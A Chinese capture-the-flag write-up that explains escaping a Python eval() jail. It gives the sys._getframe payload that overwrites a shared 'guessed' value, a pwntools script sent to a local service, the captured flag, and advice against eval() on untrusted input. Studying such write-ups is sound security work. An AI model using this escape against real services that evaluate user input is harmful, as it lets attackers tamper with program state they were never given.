# can you guess?

## 题目简述

服务把用户输入交给 Python 的 `eval()`，但随后并不检查一段固定答案，而是在子进程中比较表达式返回值与 `random.random()`。即便碰巧相等，程序也会把共享变量 `guessed` 重置为 `False`。父进程只在子进程退出后发现 `guessed.value == True` 时输出 flag。

题目的关键不是预测伪随机数，而是利用 Python 运行时反射能力越过这个逻辑边界：从 `eval()` 的调用栈定位 `guess()` 栈帧，再直接改写其局部变量所引用的共享对象。

## 解题过程

核心调用关系如下：

```python
def jail(inp):
    return eval(inp)

def guess(inp, guessed):
    import os, random

    os.setregid(65534, 65534), os.setreuid(65534, 65534)
    try:
        r = jail(inp)
        if random.random() == r:
            guessed.value = False
    except Exception:
        print("Don't break my jail")
```

`guessed` 是父进程通过 `multiprocessing.Value('b', False)` 创建的共享值。子进程虽然把真实、有效 GID 和 UID 降为 `65534`，但它仍然持有已经映射的共享对象，因此只要能获得该对象的引用，就可以调用属性赋值逻辑。

在 `eval()` 执行的表达式中，`sys._getframe(2)` 沿调用栈向上两层：上一层是 `jail()`，再上一层是 `guess()`。`guess()` 的局部变量字典中恰好包含 `guessed`，于是可用以下单行表达式将共享值设为真：

```python
__import__('sys')._getframe(2).f_locals['guessed'].__setattr__('value',True)
```

`__setattr__()` 返回 `None`，所以后续的 `random.random() == r` 为假，不会执行将共享值恢复为 `False` 的分支。子进程退出后，父进程便会读取到修改后的值并打印 flag。

完整交互脚本可以写成：

```python
from pwn import remote

io = remote("127.0.0.1", 1337)
payload = (
    "__import__('sys')._getframe(2).f_locals['guessed']"
    ".__setattr__('value',True)"
)

io.sendlineafter(b">> ", payload.encode())
print(io.recvuntil(b"}").decode())
io.close()
```

得到：

```text
shellmates{PYTHOn_FR4mE_0bj3cTs_ARENT_s3CuR3_ARE_Th3y}
```

## 方法总结

限制输入为“单个 Python 表达式”并不能构成安全沙箱。只要 `eval()` 仍能访问 `__import__`，攻击者就可以导入 `sys`，借助栈帧、局部变量和对象反射能力接触本不应暴露的状态。本题尤其说明了进程降权和语言沙箱是两条不同的安全边界：降权限制操作系统权限，却不会自动撤销子进程已经持有的共享内存引用。

可靠的修复方式是不要对不可信输入调用 `eval()`；如果业务只需要数字或有限结构，应使用严格解析器并验证类型和取值范围。若确实需要执行不可信代码，还必须使用独立进程、最小权限、系统调用限制和资源限额等操作系统级隔离，不能依赖字符串黑名单或表达式形式限制。
